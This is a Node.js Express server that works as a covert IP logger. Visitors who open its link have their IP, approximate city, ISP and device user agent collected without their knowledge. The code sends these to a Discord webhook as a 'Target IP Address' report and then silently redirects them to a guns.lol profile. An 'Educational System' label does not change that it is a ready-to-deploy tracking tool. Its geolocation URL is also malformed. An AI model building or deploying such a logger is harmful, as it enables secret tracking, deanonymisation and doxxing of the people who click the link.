const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Update this to your own personal guns.lol page url
const REDIRECT_URL = 'https://guns.lol/xsaint';

app.get('/', async (req, res) => {
    // 1. Fallback redirect safety net
    let redirected = false;
    const safeRedirect = () => {
        if (!redirected) {
            redirected = true;
            res.redirect(REDIRECT_URL);
        }
    };

    try {
        // 2. Extract the real user IP behind Render's routing proxies
        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        let userIp = rawIp ? rawIp.split(',')[0].trim() : '127.0.0.1';

        // Localhost safety check for local environment testing
        if (userIp === '::1' || userIp === '::ffff:127.0.0.1') {
            userIp = '8.8.8.8'; // Mock IP (Google DNS) for local testing purposes
        }

        // 3. Fetch location and broadband provider (ISP) data from ip-api
        let locationText = "Unknown Location";
        let broadbandText = "Unknown ISP";

        try {
            const geoRes = await fetch(`http://ip-api.com{userIp}?fields=status,country,regionName,city,isp`);
            const geoData = await geoRes.json();
            
            if (geoData.status === 'success') {
                locationText = `${geoData.city}, ${geoData.regionName}, ${geoData.country}`;
                broadbandText = geoData.isp;
            }
        } catch (geoError) {
            console.error("Geolocation API error:", geoError);
        }

        // 4. Construct a beautiful Discord Embed message
        const discordPayload = {
            embeds: [{
                title: "🌐 New Connection Tracked!",
                color: 3447003, // Premium Blue colour profile
                fields: [
                    { name: "🎯 Target IP Address", value: `\`${userIp}\``, inline: true },
                    { name: "📶 Broadband Provider / ISP", value: broadbandText, inline: true },
                    { name: "📍 Approximate Location", value: locationText, inline: false },
                    { name: "🖥️ User Agent (Device)", value: req.headers['user-agent'] || "Unknown Device", inline: false }
                ],
                timestamp: new Date().toISOString(),
                footer: { text: "Render Logger • Educational System" }
            }]
        };

        // 5. Send webhook payload data if the URL is configured in Render
        if (process.env.DISCORD_WEBHOOK_URL) {
            await fetch(process.env.DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordPayload)
            });
        } else {
            console.log("Missing DISCORD_WEBHOOK_URL in environment settings.");
            console.log("Logged Data:", { userIp, broadbandText, locationText });
        }

    } catch (error) {
        console.error("Critical routing error:", error);
    } finally {
        // 6. Ensure the target is always bounced away to your endpoint safely
        safeRedirect();
    }
});

app.listen(PORT, () => {
    console.log(`Render Logger listening on port ${PORT}`);
});
